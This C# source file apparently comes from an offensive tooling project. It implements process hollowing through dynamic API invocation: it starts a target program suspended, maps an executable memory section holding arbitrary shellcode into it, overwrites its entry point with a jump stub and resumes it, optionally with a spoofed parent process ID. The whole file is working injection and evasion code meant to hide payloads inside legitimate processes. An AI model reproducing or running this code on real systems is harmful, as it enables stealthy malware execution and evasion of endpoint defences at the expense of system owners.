using ProcessInjection.DInvoke.Native;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;

namespace ProcessInjection.DInvoke
{
    public class DynamicProcessHollowing
    {


        /*
           Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
           https://github.com/ambray/ProcessHollowing
           https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
           https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
           */

        #region Process Hollowing

        public IntPtr section_;
        public IntPtr localmap_;
        public IntPtr remotemap_;
        public IntPtr localsize_;
        public IntPtr remotesize_;
        public IntPtr pModBase_;
        public IntPtr pEntry_;
        public uint rvaEntryOffset_;
        public uint size_;
        public byte[] inner_;

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const ulong PatchSize = 0x10;
        public const int AttributeSize = 24;

        #endregion Process Hollowing


        public DynamicProcessHollowing()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }

        public uint round_to_page(uint size)
        {
            Structs.SYSTEM_INFO info = new Structs.SYSTEM_INFO();

            var funcParams = new object[] {
                    info
                };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "GetSystemInfo",
                typeof(DInvoke.Native.Delegates.GetSystemInfo),
                ref funcParams,
                true);

            info = (Structs.SYSTEM_INFO)funcParams[0];

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }



        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {

            var funcParams = new object[] { };

            var getCurrentProcess = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "GetCurrentProcess",
                typeof(DInvoke.Native.Delegates.GetCurrentProcess),
                ref funcParams,
                true);

            return getCurrentProcess;
        }


        public static Structs.PROCESS_INFORMATION StartProcess(string binaryPath)
        {

            var procInfo = new Structs.PROCESS_INFORMATION();

            var siEx = new DInvoke.Native.Structs.STARTUPINFOEX();

            var ps = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();
            var ts = new DInvoke.Native.Structs.SECURITY_ATTRIBUTES();

            var funcParams = new object[]
                {
                    null,
                    binaryPath,
                    ps,
                    ts,
                    false,
                    DInvoke.Native.Constants.CreateSuspended,
                    IntPtr.Zero,
                    null,
                    siEx,
                    procInfo
                };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CreateProcessA",
                typeof(DInvoke.Native.Delegates.CreateProcess),
                ref funcParams,
                true);

            procInfo = (DInvoke.Native.Structs.PROCESS_INFORMATION)funcParams[9];

            PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");

            return procInfo;
        }

        /*
        https://github.com/peperunas/injectopi/tree/master/CreateSection
        Attemp to create executatble section
        */
        public bool CreateSection(uint size)
        {
            Structs.LARGE_INTEGER liVal = new Structs.LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var funcParams = new object[] {
                section_,
                GenericAll,
                IntPtr.Zero,
                liVal,
                PageReadWriteExecute,
                SecCommit,
                IntPtr.Zero
            };

            var status = (int)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "ntdll.dll",
                "ZwCreateSection",
                typeof(DInvoke.Native.Delegates.ZwCreateSection),
                ref funcParams,
                true);

            section_ = (IntPtr)funcParams[0];

            PrintInfo($"[!] Executable section created.");
            return nt_success(status);
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;


            var funcParams = new object[] {
                section_,
                procHandle,
                baseAddr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                viewSize,
                1,
                (uint)0,
                protect
            };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "ntdll.dll",
                "ZwMapViewOfSection",
                typeof(DInvoke.Native.Delegates.ZwMapViewOfSection),
                ref funcParams,
                true);
            baseAddr = (IntPtr)funcParams[2];


            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public void SetLocalSection(uint size)
        {

            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
            PrintInfo($"[!] Map view section to the current process: {vals}.");
            localmap_ = vals.Key;
            localsize_ = vals.Value;

        }

        public void CopyShellcode(byte[] buf)
        {
            long lsize = size_;
            PrintInfo($"[!] Copying Shellcode into section: {lsize}. ");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
            PrintInfo($"[!] Preparing shellcode patch for the new process entry point: {ptr}. ");

            unsafe
            {
                byte* p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    Int32 val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    Int64 val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            PrintInfo($"[!] Locating the entry point for the main module in remote process.");
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    int tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            Structs.PROCESS_BASIC_INFORMATION basicInfo = new Structs.PROCESS_BASIC_INFORMATION();
            uint retLen = new uint();

            var funcParams = new object[] {
                hProc,
                0,
                basicInfo,
                (uint)(IntPtr.Size * 6),
                retLen
            };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "ntdll.dll",
                "ZwQueryInformationProcess",
                typeof(DInvoke.Native.Delegates.ZwQueryInformationProcess),
                ref funcParams,
                true);

            basicInfo = (Structs.PROCESS_BASIC_INFORMATION)funcParams[2];


            PrintInfo($"[!] Locating the module base address in the remote process.");

            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebBaseAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebBaseAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            funcParams = new object[] {
                hProc,
                readLoc,
                addrBuf,
                addrBuf.Length,
                nRead
            };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "ReadProcessMemory",
                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
                ref funcParams,
                true);

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;

            funcParams = new object[] {
                hProc,
                readLoc,
                inner_,
                inner_.Length,
                nRead
            };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "ReadProcessMemory",
                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
                ref funcParams,
                true);

            PrintInfo($"[!] Read the first page and locate the entry point: {readLoc}.");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(Structs.PROCESS_INFORMATION pInfo)
        {

            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
            PrintInfo($"[!] Locate shellcode into the suspended remote porcess: {tmp}.");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);
            var funcParams = new object[] { };
            try
            {

                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();



                funcParams = new object[] {
                    pInfo.hProcess,
                    pEntry_,
                    patch.Value,
                    pSize,
                    tPtr
                };

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "WriteProcessMemory",
                    typeof(DInvoke.Native.Delegates.WriteProcessMemoryPH),
                    ref funcParams,
                    true);

            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            byte[] tbuf = new byte[0x1000];
            IntPtr nRead = new IntPtr();


            funcParams = new object[] {
                pInfo.hProcess,
                pEntry_,
                tbuf,
                1024,
                nRead
            };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "ReadProcessMemory",
                typeof(DInvoke.Native.Delegates.ReadProcessMemory),
                ref funcParams,
                true);

            funcParams = new object[] {
                        pInfo.hThread
                    };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "ResumeThread",
                typeof(DInvoke.Native.Delegates.ResumeThread),
                ref funcParams,
                true);

            PrintSuccess($"[+] Process has been resumed.");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }

        ~DynamicProcessHollowing()
        {

            if (localmap_ != (IntPtr)0)
            {
                var funcParams = new object[] {
                    section_,
                    localmap_
                };

                DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "ntdll.dll",
                    "ZwUnmapViewOfSection",
                    typeof(DInvoke.Native.Delegates.ZwUnmapViewOfSection),
                    ref funcParams,
                    true);
            }

        }


        public void DynamicProcHollow(string binary, byte[] shellcode)
        {

            Structs.PROCESS_INFORMATION pinf = StartProcess(binary);
            CreateSection((uint)shellcode.Length);
            FindEntry((IntPtr)pinf.hProcess);
            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            var funcParams = new object[] {
                    pinf.hThread
                    };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(DInvoke.Native.Delegates.CloseHandle),
                ref funcParams,
                true);

            funcParams = new object[] {
                    pinf.hProcess
                    };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(DInvoke.Native.Delegates.CloseHandle),
                ref funcParams,
                true);
        }



        public void PPIDDynProcHollow(string binary, byte[] shellcode, int parentpid)
        {

            DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
            DynamicProcessHollowing hollow = new DynamicProcessHollowing();
            hollow.CreateSection((uint)shellcode.Length);
            hollow.FindEntry(pinf.hProcess);
            hollow.SetLocalSection((uint)shellcode.Length);
            hollow.CopyShellcode(shellcode);
            hollow.MapAndStart(pinf);


            var funcParams = new object[] {
                    pinf.hThread
                    };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(DInvoke.Native.Delegates.CloseHandle),
                ref funcParams,
                true);

            funcParams = new object[] {
                    pinf.hProcess
                    };

            DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                "kernel32.dll",
                "CloseHandle",
                typeof(DInvoke.Native.Delegates.CloseHandle),
                ref funcParams,
                true);

        }
    }
}
